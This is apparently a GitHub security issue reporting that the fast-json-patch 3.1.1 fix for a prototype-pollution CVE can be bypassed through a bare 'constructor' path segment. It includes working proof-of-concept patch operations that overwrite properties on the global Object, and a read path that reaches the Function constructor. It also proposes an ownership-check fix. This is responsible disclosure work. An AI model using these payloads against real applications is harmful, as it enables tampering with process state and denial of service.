# Security: CVE-2021-4279 fix (3.1.1) is incomplete - bare `constructor` segment is still reachable

`fast-json-patch` 3.1.1

---

### Summary

3.1.1 is the release that fixed **CVE-2021-4279 / GHSA-8gh8-hqwg-xf34** (prototype pollution, CVSS 7.3). The fix, commit `7ad6af41eabb2d799f698740a91284d762c955c9`, widened the guard from one pattern to two:

```diff
- if (banPrototypeModifications && key == '__proto__') {
+ if (banPrototypeModifications &&
+     (key == '__proto__' ||
+         (key == 'prototype' && t > 0 && keys[t - 1] == 'constructor'))) {
```

That still leaves `constructor` itself unblocked, as long as the next segment is not `prototype`. On **3.1.1** the guard can therefore be walked past one segment over, and the documented guarantee of `banPrototypeModifications` (default on) does not hold.

### Reproduce (fast-json-patch 3.1.1, Node 22)

```js
const jsonpatch = require('fast-json-patch');

// the guard fires on both shapes the patch enumerates - expected
jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/__proto__/x', value: 1 }]);
// TypeError: JSON-Patch: modifying `__proto__` or `constructor/prototype` prop is banned

jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/constructor/prototype/x', value: 1 }]);
// TypeError: same

// but a bare `constructor` is not in the list
jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/a/constructor/x', value: 'INJECTED' }]);
Object.x;   // => 'INJECTED'   <- own property written on the global Object constructor

jsonpatch.applyPatch({ a: {} }, [{ op: 'replace', path: '/a/constructor/constructor', value: 'PWNED' }]);
// Object.constructor === 'PWNED'

// the read path runs through the same guard, so it has the same gap
jsonpatch.getValueByPointer({}, '/constructor/constructor');   // => [Function: Function]
```

`getValueByPointer` is not a separate code path: it synthesizes an `_get` operation and re-enters `applyOperation`.

### Why this is the same class as the CVE, not a cosmetic difference

The patch's own reasoning is that a patch document must not be able to reach built-in objects. `constructor` is exactly such a built-in reach: it is inherited from `Object.prototype`, so `{}['constructor']` is `Object`, and a second `constructor` yields `Function`. The fix enumerates two spellings of the escape instead of closing the door.

A denylist cannot close it: `valueOf`, `toLocaleString`, `__defineGetter__`, `isPrototypeOf`, `propertyIsEnumerable` and anything added to `Object.prototype` in future are reachable the same way.

### Impact, and what I did not demonstrate

* Write side: own properties of `Object` / `Function` can be overwritten from a data-only document - e.g. replacing `Object.assign` or `Object.keys`, giving process-wide integrity loss and denial of service.
* Read side: the `Function` constructor becomes reachable. Escalation needs the consumer to call the resolved value; **the library itself never calls it**, and I have not demonstrated such a sink.

I did not test any downstream application, and I am not claiming end-to-end RCE.

### Suggested fix

Check **ownership** at the point the loop descends, instead of matching segments:

```js
if (!Object.prototype.hasOwnProperty.call(obj, key)) {
    throw new JsonPatchError('Path not found in document', 'OPERATION_PATH_UNRESOLVED', index, operation, document);
}
```

That closes the whole class structurally and lets the denylist be retired. The `jsonpatch` package does this and resisted all seven payloads I tried.

Related: #308 proposes backporting this fix to v2. If that backport happens, it is worth fixing the class rather than porting the two-pattern check, otherwise v2 inherits the same gap.

### Affected range

Verified on **3.1.1** only. Given the shape of the check, any release carrying commit `7ad6af4` is affected by the gap - please confirm from history rather than from my claim.

---

### On disclosure

Private vulnerability reporting is **disabled** on this repository, so there is no private form to use. I am posting the minimal version rather than dropping a full technical report into a public thread unasked.

Enable *Settings -> Code security -> Private vulnerability reporting*, or point me at a private channel, and I will send the complete report: the full escaping segment set, the runnable harness (`verify_local.js`), and RFC 6902 conformance results for the proposed fix.

If you would rather keep it public, say so and I will post everything here - your call.
